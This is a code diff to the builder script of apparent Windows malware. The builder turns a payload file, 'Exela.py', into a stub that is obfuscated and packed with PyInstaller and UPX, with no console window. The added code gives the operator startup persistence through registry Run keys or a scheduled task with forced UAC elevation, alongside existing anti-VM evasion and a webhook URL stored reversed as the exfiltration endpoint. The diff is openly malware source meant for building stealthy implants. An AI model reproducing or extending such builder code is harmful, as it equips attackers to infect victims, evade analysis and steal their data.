@@ -4,6 +4,8 @@ class Build:
     def __init__(self) -> None:
         self.pyinstallerCommand = "pyinstaller --onefile --noconsole --clean --upx-dir upx-4.0.2-win64 "
         self.useIcon = False
+        self.startup = "false"
+        self.startupMethod = "regedit"
         self.antivmorospusu = "true"
         self.compileToExe()
     def compileToExe(self):
@@ -12,11 +14,29 @@ class Build:
             os.system("cls")
             getWebhook = str(input('Enter Your webhook URL : '))
             time.sleep(0.5)
+            os.system("cls")
             getAntiVmReq = str(input('Yes/no\nDo you want to use Anti-VM : '))
             if getAntiVmReq.lower() == "n" or getAntiVmReq.lower() == "no":
                 self.antivmorospusu = "false"
             else:
                 self.antivmorospusu = "true"
+            os.system("cls")
+            getStartupReq = str(input('Yes/no\nDo you want to use Startup : '))
+            if getStartupReq.lower() == "y" or getStartupReq.lower() == "yes":
+                self.startup = "true"
+                print("--------------------------------------------\n1-) HKCLM/HKLM Startup (This method copies the file to startup using the registry)\n2-)Schtask Startup (This method uses the task scheduler to save the file to the task scheduler and automatically restarts it when any user logs in, this method is more private than the other method but requires admin privilege)\n--------------------------------------------\n\n")
+                getStartupMethod = input("1/2 Enter your selection: ")
+                if getStartupMethod == "1":
+                    self.startupMethod = "regedit"
+                elif getStartupMethod == "2":
+                    self.startupMethod = "schtasks"
+                    self.pyinstallerCommand += "--uac-admin "
+                else:
+                    print("unkown Startup method, startup has been disabled.")
+                    self.startup ="false"
+                    self.startupMethod = None
+            else:self.startup= "false"
+            os.system("cls")
             getIcon = str(input("Yes/no\nDo you want to change the icon of the file : "))
             iconPath = None
             if getIcon.lower() == "yes" or getIcon.lower() == "y":
@@ -32,16 +52,16 @@ class Build:
             else:self.pyinstallerCommand += "quicaxd.py"
             with open("Exela.py", "r", encoding="utf-8", errors="ignore") as f:
                 readedCode = f.read()
-            replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook[::-1]).replace('%AnTiVm%', self.antivmorospusu)
+            replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook[::-1]).replace('%AnTiVm%', self.antivmorospusu).replace("%StartuP%", self.startup).replace("%MethoD%", self.startupMethod)
             
             with open("stub.py", "w", encoding="utf-8", errors="ignore") as x:
                 x.write(replacedCode)
             self.obfuscateFile()
             time.sleep(1)
             os.system(self.pyinstallerCommand)
-        except:
+        except Exception as e:
             os.system('cls')
-            print("An error occurred while compiling your file\nplease contact the coder or check your python version")
+            print("An error occurred while compiling your file\nplease contact the coder or check your python version : ", str(e))
             time.sleep(1)
             sys.exit(0)
         else:
